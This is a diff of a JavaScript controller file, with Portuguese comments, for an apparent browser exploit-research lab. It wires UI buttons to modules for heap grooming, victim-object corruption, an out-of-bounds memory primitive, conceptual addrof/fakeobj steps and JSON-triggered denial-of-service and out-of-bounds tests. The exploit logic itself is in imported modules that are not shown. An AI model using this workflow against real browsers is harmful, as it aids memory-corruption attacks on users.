@@ -6,156 +6,99 @@ import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
 import * as JsonExploitTest from './json_exploit_test.mjs';
+import * as VictimFinder from './victim_finder.mjs'; // <-- NOVA IMPORTAÇÃO
 import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
-import * as VictimFinder from './victim_finder.mjs';
 
 let uiInitialized = false;
 
 const App = {
-    exploitSuccessfulThisSession: false, // Usado para grooming/gap
-    isCurrentlyRunningStrategies: false, // Usado para grooming/gap
+    exploitSuccessfulThisSession: false,
+    isCurrentlyRunningStrategies: false,
 
-    // Função de grooming (marcada como WIP, então o botão está desabilitado no HTML)
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
-        appLog("AVISO: Funcionalidade de Grooming/Busca de GAP está em desenvolvimento e pode não funcionar.", "warn", FNAME_STRAT);
-        // ... (manter a lógica existente, mas sabendo que pode não estar completa)
-        if (App.isCurrentlyRunningStrategies) return;
+        appLog("AVISO: Funcionalidade de Grooming/Busca de GAP está em desenvolvimento e pode não funcionar como esperado.", "warn", FNAME_STRAT);
+        if (App.isCurrentlyRunningStrategies) {
+            appLog("Estratégias de grooming já em execução.", "warn", FNAME_STRAT);
+            return;
+        }
         App.isCurrentlyRunningStrategies = true;
-        // ... (resto da lógica como antes) ...
-        App.isCurrentlyRunningStrategies = false;
-    },
+        const btn = document.getElementById('btnRunGroomingStrategies');
+        if (btn) btn.disabled = true;
 
-    // Função de teste de GAP (marcada como WIP)
-    updateCurrentTestGapFromScanUIAndTestSingle: () => {
-        const FNAME_SINGLE = "App.updateCurrentTestGapFromScanUIAndTestSingle";
-        appLog("AVISO: Funcionalidade de Teste de GAP está em desenvolvimento.", "warn", FNAME_SINGLE);
-        // ... (manter a lógica existente) ...
+        // Lógica de grooming (placeholder ou a ser implementada/revisada)
+        const victimSize = parseInt(document.getElementById('victim_object_size_groom').value) || 288;
+        await Groomer.groomHeapForSameSize(100, victimSize, 20); // Exemplo de parâmetros
+        // Após o grooming, tentar encontrar e corromper
+        const gapStart = parseInt(document.getElementById('gap_start_input').value) || 0;
+        const gapEnd = parseInt(document.getElementById('gap_end_input').value) || 1024;
+        const gapStep = parseInt(document.getElementById('gap_step_input').value) || 8;
+        await Corruptor.findAndCorruptVictimFields_Iterative(gapStart, gapEnd, gapStep, victimSize);
+
+        if (btn) btn.disabled = false;
+        App.isCurrentlyRunningStrategies = false;
+        appLog("Todas as estratégias de grooming & busca de GAP (WIP) concluídas.", "test", FNAME_STRAT);
     },
 
     setupUIEventListeners: () => {
         // Testes de Módulos
-        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
-        if (moduleTestButtonsContainer) {
-            moduleTestButtonsContainer.innerHTML = ''; // Limpa para evitar duplicação
-            const btnTestInt64 = document.createElement('button');
-            btnTestInt64.textContent = 'Testar Módulo Int64';
-            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
-            moduleTestButtonsContainer.appendChild(btnTestInt64);
-
-            const btnTestUtils = document.createElement('button');
-            btnTestUtils.textContent = 'Testar Módulo Utils';
-            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule(appLog)); // Passar appLog
-            moduleTestButtonsContainer.appendChild(btnTestUtils);
-
-            const btnTestCore = document.createElement('button');
-            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
-            btnTestCore.onclick = () => Core.testModule(appLog); // Passar appLog
-            moduleTestButtonsContainer.appendChild(btnTestCore);
-        }
+        document.getElementById('btnTestInt64')?.addEventListener('click', () => Int64Lib.testModule(appLog));
+        document.getElementById('btnTestUtils')?.addEventListener('click', () => { import('./utils.mjs').then(utils => utils.testModule()); });
+        document.getElementById('btnTestCore')?.addEventListener('click', () => Core.testModule(appLog));
 
         // Passo 0
         document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
 
-        // Passos 1 & 2 (Desabilitados no HTML por enquanto, mas listeners podem ficar)
-        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
-        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
-        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', () => {
-            appLog("Botão 'Iniciar Busca & Corrupção' (Passo 2) clicado - Funcionalidade WIP.", "warn", "App");
-            Corruptor.findAndCorruptVictimFields_Iterative();
+        // Passos 1 & 2 (Grooming & Corruptor)
+        document.getElementById('btnPrepareVictim')?.addEventListener('click', () => {
+            const size = parseInt(document.getElementById('victim_object_size_groom').value) || 288;
+            Groomer.prepareVictim(size);
         });
-        document.getElementById('btnTestKnownGap')?.addEventListener('click', () => {
-             appLog("Botão 'Testar Corrupção no GAP Conhecido' (Passo 2) clicado - Funcionalidade WIP.", "warn", "App");
-            Corruptor.testCorruptKnownGap();
+        // document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies); // Botão está desabilitado por padrão
+        document.getElementById('btnFindAndCorrupt')?.addEventListener('click', () => {
+            const gapStart = document.getElementById('gap_start_input').value;
+            const gapEnd = document.getElementById('gap_end_input').value;
+            const gapStep = document.getElementById('gap_step_input').value;
+            const victimSize = document.getElementById('victim_object_size_groom').value;
+            Corruptor.findAndCorruptVictimFields_Iterative(gapStart, gapEnd, gapStep, victimSize);
         });
+        document.getElementById('btnTestCorruptKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGapButtonHandler);
 
-        // Passos 3 & 4
-        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
-        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
-        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
 
-        // Passo 5: Teste JSON DoS por Recursão
-        document.getElementById('btnTestJsonRecursionExploit')?.addEventListener('click', async () => {
-            const scenarioSelectEl = document.getElementById('jsonRecursionScenarioSelect');
-            const selectedScenario = scenarioSelectEl ? scenarioSelectEl.value : 'scenario_poc_v23s_corrected';
-            appLog(`Botão 'Testar JSON DoS por Recursão' clicado. Cenário: ${selectedScenario}`, 'test', 'App.JsonDoS');
-            
-            // O objeto passado para JSON.stringify é definido dentro de cada PoC/cenário
-            // Aqui apenas chamamos a função de topo que internamente usa seu próprio testObject.
-            await JsonExploitTest.runJsonRecursionTest(selectedScenario);
-        });
-
+        // Listener para o NOVO BOTÃO do VictimFinder
         const btnFindVictimEl = document.getElementById('btnFindVictim');
-if (btnFindVictimEl) {
-    btnFindVictimEl.onclick = () => {
-        // Ler valores hex e converter para número para scanStartOffset
-        const offsetHexStr = document.getElementById('victimFinderScanStartOffset').value;
-        let offsetInt;
-        try {
-            offsetInt = parseInt(offsetHexStr, 16);
-            if (isNaN(offsetInt)) throw new Error("Valor Hex inválido");
-        } catch (e) {
-            appLog(`Offset inicial de varredura '${offsetHexStr}' é inválido. Usando null para que VictimFinder use o padrão.`, "warn", "App.VictimFinderUI");
-            offsetInt = null; // Deixa VictimFinder decidir o padrão
+        if (btnFindVictimEl) {
+            btnFindVictimEl.onclick = VictimFinder.findVictimButtonHandler;
         }
-        document.getElementById('victimFinderScanStartOffset').value = offsetInt !== null ? `0x${offsetInt.toString(16)}` : ""; // Atualiza UI com valor processado ou limpa
 
-        VictimFinder.findVictimButtonHandler(); // findVictimButtonHandler agora lê os campos internamente.
-    };
-}
-
-        // Passo 6: JSON como Gatilho OOB Exploit
-        document.getElementById('btnJsonTriggerOOBExploit')?.addEventListener('click', async () => {
-            appLog("Botão 'Executar JSON como Gatilho OOB Exploit' clicado.", 'test', 'App.JsonOOB');
-            if (!Core.oob_dataview_real) {
-                appLog("ERRO: Primitiva OOB (Core.oob_dataview_real) não está ativa. Execute o Passo 0 primeiro!", "error", "App.JsonOOB");
-                return;
-            }
-
-            const targetObjectSelectEl = document.getElementById('jsonOobTargetObject');
-            const relativeOffsetEl = document.getElementById('jsonOobRelativeOffset');
-            const valueToWriteHexEl = document.getElementById('jsonOobValueToWriteHex');
-            const bytesToReadEl = document.getElementById('jsonOobBytesToRead');
-
-            const targetObjectType = targetObjectSelectEl ? targetObjectSelectEl.value : 'new_array_buffer';
-            const relativeOffset = relativeOffsetEl ? parseInt(relativeOffsetEl.value) : 0;
-            const valueHex = valueToWriteHexEl ? valueToWriteHexEl.value : "0x0";
-            const bytesToRead = bytesToReadEl ? parseInt(bytesToReadEl.value) : 4;
-            let valueToWrite;
-
-            try {
-                valueToWrite = parseInt(valueHex); // Deveria usar AdvancedInt64 para valores maiores que 32bit
-                if (isNaN(valueToWrite)) throw new Error("Valor para escrita inválido");
-            } catch (e) {
-                appLog(`Valor para escrita OOB inválido: '${valueHex}'. Usando 0.`, 'warn', 'App.JsonOOB');
-                valueToWrite = 0;
-            }
-
-            let objectForJsonStringify;
-            switch (targetObjectType) {
-                case 'core_oob_buffer':
-                    objectForJsonStringify = Core.oob_array_buffer_real;
-                    if (!objectForJsonStringify) {
-                        appLog("ERRO: Core.oob_array_buffer_real não está definido! Execute Passo 0.", "error", "App.JsonOOB");
-                        return;
-                    }
-                    break;
-                case 'new_array_buffer':
-                default:
-                    objectForJsonStringify = new ArrayBuffer(128); 
-                    break;
-            }
-            appLog(`Alvo para JSON.stringify (que terá 'toJSON' chamado): ${objectForJsonStringify.constructor.name} (${objectForJsonStringify.byteLength || 'N/A'} bytes)`, 'info', 'App.JsonOOB');
-
-            await JsonExploitTest.jsonTriggeredOOBInteraction(
-                objectForJsonStringify,
-                relativeOffset,
-                valueToWrite,
-                bytesToRead
-            );
+        // Passos 3 & 4 (PostExploit)
+        document.getElementById('btnSetupAddrofFakeobj')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
+        document.getElementById('btnTestAddrof')?.addEventListener('click', PostExploit.test_addrof_conceptual);
+        document.getElementById('btnTestFakeObj')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
+        
+        // Passo 5 (JSON DoS)
+        document.getElementById('btnRunJsonRecursionTest')?.addEventListener('click', () => {
+            const scenario = document.getElementById('jsonRecursionScenario').value;
+            JsonExploitTest.runJsonRecursionTest(scenario);
         });
 
-        // Listeners para Configurações Globais OOB
+        // Passo 6 (JSON OOB Trigger)
+        document.getElementById('btnRunJsonOOBExploit')?.addEventListener('click', () => {
+            const targetType = document.getElementById('jsonOobTargetObject').value;
+            const relativeOffset = parseInt(document.getElementById('jsonOobRelativeOffset').value, 10);
+            const valueHex = document.getElementById('jsonOobValueToWriteHex').value;
+            const bytesToRead = parseInt(document.getElementById('jsonOobBytesToRead').value, 10);
+            JsonExploitTest.jsonTriggeredOOBInteraction(targetType, relativeOffset, valueHex, bytesToRead);
+        });
+        
+        // Log
+        document.getElementById('btnClearLog')?.addEventListener('click', () => {
+            const logOutputDiv = document.getElementById('logOutput');
+            if (logOutputDiv) logOutputDiv.innerHTML = '';
+            appLog("Log limpo.", "info", "App.ClearLog");
+        });
+
+        // Listeners para atualização de config OOB
         document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
         document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
@@ -171,14 +114,12 @@ if (btnFindVictimEl) {
         App.exploitSuccessfulThisSession = false;
         App.isCurrentlyRunningStrategies = false;
         
-        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
-        if (btnRunStrategies) { // Mantém desabilitado se o HTML o define assim
-            // btnRunStrategies.disabled = false; 
-            // btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
-        }
-        appLog("Laboratório Modular (v2.9.0 - JSON OOB Trigger) pronto.", "good", "App.Init");
+        appLog("Laboratório Modular (v3.0.0 - Com VictimFinder) pronto.", "good", "App.Init");
         const addrofGapEl = document.getElementById('addrofGap');
-        if (addrofGapEl) addrofGapEl.value = ""; // Limpa campo
+        if (addrofGapEl) addrofGapEl.value = ""; 
+        const gapToTestInputEl = document.getElementById('gap_to_test_input');
+        if (gapToTestInputEl) gapToTestInputEl.value = "";
+
         uiInitialized = true;
     }
 };
